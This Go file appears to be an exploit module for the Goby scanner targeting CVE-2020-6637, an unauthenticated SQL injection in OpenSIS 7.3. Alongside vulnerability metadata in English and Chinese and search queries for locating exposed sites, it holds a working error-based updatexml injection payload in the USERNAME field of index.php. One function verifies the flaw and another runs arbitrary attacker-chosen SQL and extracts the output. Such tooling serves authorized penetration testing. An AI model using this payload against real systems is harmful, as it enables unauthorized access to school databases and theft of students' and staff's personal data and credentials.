package exploits

import (
	"crypto/sha1"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "OpenSIS v7.3 Unauthenticated SQL Injection (CVE-2020-6637)",
    "Description": "OpenSIS Community Edition version 7.3 is vulnerable to SQL injection via the USERNAME parameter of index.php.",
    "Impact": "OpenSIS v7.3 Unauthenticated SQL Injection (CVE-2020-6637)",
    "Recommendation": "update",
    "Product": "OpenSIS",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "openSIS v7.3 版本 USERNAME 参数 SQL 注入漏洞（CVE-2020-6637）",
            "Description": "<p>openSIS 是 OS4ED 的商业级、安全、可扩展和直观的学生信息系统、学校管理软件。<br></p><p>openSIS v7.3 版本 USERNAME 参数 存在 SQL 注入漏洞（CVE-2020-6637）。<span style=\"font-size: 16px;\">攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。 </span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。&nbsp;</span><br></p>",
            "Recommendation": "<p><span style=\"font-size: 16px;\">厂商已发布解决方案，请升级产品至大于 7.3 版本：</span><span style=\"font-size: 16px;\"><a href=\"https://github.com/OS4ED/openSIS-Classic/releases\">https://github.com/OS4ED/openSIS-Classic/releases</a></span><br></p>",
            "Product": "openSIS",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "OpenSIS v7.3 Unauthenticated SQL Injection (CVE-2020-6637)",
            "Description": "OpenSIS Community Edition version 7.3 is vulnerable to SQL injection via the USERNAME parameter of index.php.",
            "Impact": "OpenSIS v7.3 Unauthenticated SQL Injection (CVE-2020-6637)",
            "Recommendation": "update",
            "Product": "OpenSIS",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "title=\"openSIS Student Information System\"",
    "GobyQuery": "title=\"openSIS Student Information System\"",
    "Author": "Ovi3",
    "Homepage": "https://opensis.com/",
    "DisclosureDate": "2020-08-24",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-6637.yaml",
        "https://cinzinga.com/CVE-2020-6637/",
        "https://nvd.nist.gov/vuln/detail/CVE-2020-6637",
        "https://github.com/OS4ED/openSIS-Classic/commit/1127ae0bb7c3a2883febeabc6b71ad8d73510de8"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2020-6637"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202008-1172"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sqlQuery",
            "type": "input",
            "value": "select user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "openSIS-Student-Information-System"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10249"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/index.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			randInt := 100000 + rand.Intn(100000)
			cfg.Data = "USERNAME=" + url.QueryEscape(fmt.Sprintf(`')or updatexml(1,concat(0x7e,(select sha1(%d)),0x7e),1);-- -`, randInt)) + "&PASSWORD=A&language=en&log="
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				sha1Res := fmt.Sprintf("%x", sha1.Sum([]byte(strconv.Itoa(randInt))))
				return strings.Contains(resp.RawBody, sha1Res[:20])
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sqlQuery := ss.Params["sqlQuery"].(string)
			cfg := httpclient.NewPostRequestConfig("/index.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "USERNAME=" + url.QueryEscape(fmt.Sprintf(`')or updatexml(1,concat(0x7e,(%s),0x7e),1);-- -`, sqlQuery)) + "&PASSWORD=A&language=en&log="
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				m := regexp.MustCompile(`XPATH syntax error: '(.*?)'</TD>`).FindStringSubmatch(resp.RawBody)
				if len(m) > 0 {
					expResult.Success = true
					if strings.HasPrefix(m[1], "~") {
						m[1] = m[1][1:]
					}
					if strings.HasSuffix(m[1], "~") {
						m[1] = m[1][:len(m[1])-1]
					}
					expResult.Output = m[1]
				}
			}
			return expResult
		},
	))
}
